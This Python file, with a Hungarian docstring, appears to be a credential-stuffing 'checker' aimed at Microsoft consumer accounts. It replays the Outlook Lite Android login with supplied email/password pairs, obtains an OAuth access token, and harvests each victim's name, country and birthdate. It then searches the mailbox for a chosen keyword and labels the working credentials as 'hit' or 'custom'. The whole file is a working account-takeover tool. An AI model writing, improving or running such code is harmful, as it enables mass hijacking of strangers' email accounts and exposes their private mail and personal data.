import requests
import uuid
import json
import re
import time
from fake_useragent import UserAgent

_ua = UserAgent()

def generate_user_agent():
    try:
        return _ua.random
    except:
        return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

def checker_worker_single(email: str, password: str, keyword: str):
    """
    Egy account ellenőrzése.
    Return: dict {"status": "hit/custom/bad/error", "data": {...}}
    """
    session = requests.Session()
    try:
        user_agent = generate_user_agent()
        url = (
            "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?"
            f"client_info=1&haschrome=1&login_hint={email}"
            "&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
            "&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            "&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
        )

        headers = {
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": user_agent,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "return-client-request-id": "false",
            "client-request-id": str(uuid.uuid4()),
            "x-ms-sso-ignore-sso": "1",
            "correlation-id": str(uuid.uuid4()),
            "x-client-ver": "1.1.0+9e54a0d1",
            "x-client-os": "28",
            "x-client-sku": "MSAL.xplat.android",
            "x-client-src-sku": "MSAL.xplat.android",
            "X-Requested-With": "com.microsoft.outlooklite",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1",
            "Sec-Fetch-Dest": "document",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US,en;q=0.9",
        }

        response = session.get(url, headers=headers, allow_redirects=True, timeout=30)
        response_text = response.text

        # PPFT extraction
        PPFT = ""
        urlPost = ""
        
        server_data_pattern = r'var ServerData = ({.*?});'
        server_data_match = re.search(server_data_pattern, response_text, re.DOTALL)
        
        if server_data_match:
            try:
                server_data_json = server_data_match.group(1)
                server_data = json.loads(server_data_json)
                sFTTag = server_data.get('sFTTag', '')
                if sFTTag:
                    ppft_pattern = r'value="([^"]+)"'
                    ppft_match = re.search(ppft_pattern, sFTTag)
                    if ppft_match:
                        PPFT = ppft_match.group(1)
                urlPost = server_data.get('urlPost', '')
            except json.JSONDecodeError:
                pass

        if not PPFT:
            start_marker = 'name="PPFT" value="'
            start_index = response_text.find(start_marker)
            if start_index != -1:
                start_index += len(start_marker)
                end_index = response_text.find('"', start_index)
                PPFT = response_text[start_index:end_index] if end_index != -1 else ""

        if not urlPost:
            urlpost_pattern = r'"urlPost":"([^"]+)"'
            urlpost_match = re.search(urlpost_pattern, response_text)
            if urlpost_match:
                urlPost = urlpost_match.group(1)

        if not PPFT or not urlPost:
            return {"status": "bad", "reason": "No PPFT/urlPost"}

        # Login POST
        cookies_dict = session.cookies.get_dict()
        MSPRequ = cookies_dict.get('MSPRequ', '')
        uaid_cookie = cookies_dict.get('uaid', '')
        MSPOK = cookies_dict.get('MSPOK', '')
        OParams = cookies_dict.get('OParams', '')
        referer_url = response.url

        data_string = (
            f"i13=1&login={email}&loginfmt={email}"
            f"&type=11&LoginOptions=1&lrt=&lrtPartition="
            f"&hisRegion=&hisScaleUnit=&passwd={password}"
            f"&ps=2&psRNGCDefaultType=&psRNGCEntropy="
            f"&psRNGCSLK=&canary=&ctx=&hpgrequestid="
            f"&PPFT={PPFT}&PPSX=Passport&NewUser=1"
            f"&FoundMSAs=&fspost=0&i21=0"
            f"&CookieDisclosure=0&IsFidoSupported=0"
            f"&isSignupPost=0&isRecoveryAttemptPost=0&i19=3772"
        )

        headers_post = {
            "User-Agent": user_agent,
            "Pragma": "no-cache",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Host": "login.live.com",
            "Connection": "keep-alive",
            "Content-Length": str(len(data_string)),
            "Cache-Control": "max-age=0",
            "Upgrade-Insecure-Requests": "1",
            "Origin": "https://login.live.com",
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Requested-With": "com.microsoft.outlooklite",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1",
            "Sec-Fetch-Dest": "document",
            "Referer": referer_url,
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US,en;q=0.9",
            "Cookie": f"MSPRequ={MSPRequ}; uaid={uaid_cookie}; MSPOK={MSPOK}; OParams={OParams}"
        }

        post_response = session.post(
            urlPost, data=data_string,
            headers=headers_post,
            allow_redirects=False, timeout=30
        )

        # Auth check
        cookies_dict = session.cookies.get_dict()
        if "__Host-MSAAUTHP" not in cookies_dict:
            return {"status": "bad", "reason": "Auth failed"}

        # Token extraction
        auth_code = ""
        if post_response.status_code in [301, 302, 303, 307, 308]:
            redirect_url = post_response.headers.get('Location', '')
            if redirect_url and 'msauth://' in redirect_url and 'code=' in redirect_url:
                auth_code = redirect_url.split('code=')[1].split('&')[0]
        else:
            redirect_pattern = r'window\.location\s*=\s*["\']([^"\']+)["\']'
            redirect_match = re.search(redirect_pattern, post_response.text)
            if redirect_match:
                redirect_url = redirect_match.group(1)
                if 'msauth://' in redirect_url and 'code=' in redirect_url:
                    auth_code = redirect_url.split('code=')[1].split('&')[0]

        CID = cookies_dict.get('MSPCID', '')
        if CID:
            CID = CID.upper()

        access_token = ""
        if auth_code:
            url_token = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token"
            data_token = {
                "client_info": "1",
                "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
                "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
                "grant_type": "authorization_code",
                "code": auth_code,
                "scope": "profile openid offline_access https://outlook.office.com/M365.Access"
            }
            token_response = requests.post(
                url_token, data=data_token,
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                timeout=30
            )
            if token_response.status_code == 200:
                token_data = token_response.json()
                access_token = token_data.get("access_token", "")

        if not access_token or not CID:
            return {"status": "bad", "reason": "No token"}

        # Profile data
        Name = ""
        Country = ""
        Birthdate = "N/A"
        Total = "NO"
        Date = "N/A"

        profile_url = "https://substrate.office.com/profileb2/v2.0/me/V1Profile"
        profile_headers = {
            "User-Agent": "Outlook-Android/2.0",
            "Pragma": "no-cache",
            "Accept": "application/json",
            "ForceSync": "false",
            "Authorization": f"Bearer {access_token}",
            "X-AnchorMailbox": f"CID:{CID}",
            "Host": "substrate.office.com",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip"
        }

        pRes = requests.get(profile_url, headers=profile_headers, timeout=30)
        if pRes.status_code == 200:
            profile_data = pRes.json()
            if "accounts" in profile_data and profile_data["accounts"]:
                first_account = profile_data["accounts"][0]
                Country = first_account.get("location", "")
                BD = first_account.get("birthDay", "")
                BM = first_account.get("birthMonth", "")
                BY = first_account.get("birthYear", "")
                if BD and BM and BY:
                    Birthdate = f"{BY}-{str(BM).zfill(2)}-{str(BD).zfill(2)}"
            if "names" in profile_data and profile_data["names"]:
                first_name = profile_data["names"][0]
                Name = first_name.get("displayName", "")

        # Search for keyword
        search_url = "https://outlook.live.com/search/api/v2/query?n=124&cv=tNZ1DVP5NhDwG%2FDUCelaIu.124"
        search_payload = {
            "Cvid": "7ef2720e-6e59-ee2b-a217-3a4f427ab0f7",
            "Scenario": {"Name": "owa.react"},
            "TimeZone": "United Kingdom Standard Time",
            "TextDecorations": "Off",
            "EntityRequests": [{
                "EntityType": "Conversation",
                "ContentSources": ["Exchange"],
                "Filter": {
                    "Or": [
                        {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
                        {"Term": {"DistinguishedFolderName": "DeletedItems"}}
                    ]
                },
                "From": 0,
                "Query": {"QueryString": keyword},
                "RefiningQueries": None,
                "Size": 25,
                "Sort": [
                    {"Field": "Score", "SortDirection": "Desc", "Count": 3},
                    {"Field": "Time", "SortDirection": "Desc"}
                ],
                "EnableTopResults": True,
                "TopResultsCount": 3
            }],
            "AnswerEntityRequests": [{
                "Query": {"QueryString": keyword},
                "EntityTypes": ["Event", "File"],
                "From": 0,
                "Size": 100,
                "EnableAsyncResolution": True
            }],
            "QueryAlterationOptions": {
                "EnableSuggestion": True,
                "EnableAlteration": True,
                "SupportedRecourseDisplayTypes": [
                    "Suggestion", "NoResultModification",
                    "NoResultFolderRefinerModification", "NoRequeryModification", "Modification"
                ]
            },
            "LogicalId": "446c567a-02d9-b739-b9ca-616e0d45905c"
        }

        search_headers = {
            "User-Agent": "Outlook-Android/2.0",
            "Pragma": "no-cache",
            "Accept": "application/json",
            "ForceSync": "false",
            "Authorization": f"Bearer {access_token}",
            "X-AnchorMailbox": f"CID:{CID}",
            "Host": "substrate.office.com",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip",
            "Content-Type": "application/json"
        }

        search_response = requests.post(
            search_url, json=search_payload,
            headers=search_headers, timeout=30
        )

        if search_response.status_code == 200:
            search_text = search_response.text

            # Date extraction
            date_start = search_text.find('"LastModifiedTime":"')
            if date_start != -1:
                date_start += len('"LastModifiedTime":"')
                date_end = search_text.find('"', date_start)
                Date = search_text[date_start:date_end] if date_end != -1 else "N/A"

            # Total extraction
            total_start = search_text.find('"Total":')
            if total_start != -1:
                total_start += len('"Total":')
                total_end = search_text.find(',', total_start)
                if total_end == -1:
                    total_end = search_text.find('}', total_start)
                Total = search_text[total_start:total_end].strip() if total_end != -1 else "NO"

        # Result categorization
        if Total != "0" and Total != "NO":
            return {
                "status": "hit",
                "data": {
                    "email": email,
                    "password": password,
                    "country": Country,
                    "name": Name,
                    "birthdate": Birthdate,
                    "date": Date,
                    "mails": Total
                }
            }
        elif Name or Country:
            return {
                "status": "custom",
                "data": {
                    "email": email,
                    "password": password,
                    "country": Country,
                    "name": Name,
                    "birthdate": Birthdate
                }
            }
        else:
            return {"status": "bad", "reason": "No data"}

    except Exception as e:
        return {"status": "error", "reason": str(e)}
    finally:
        session.close()
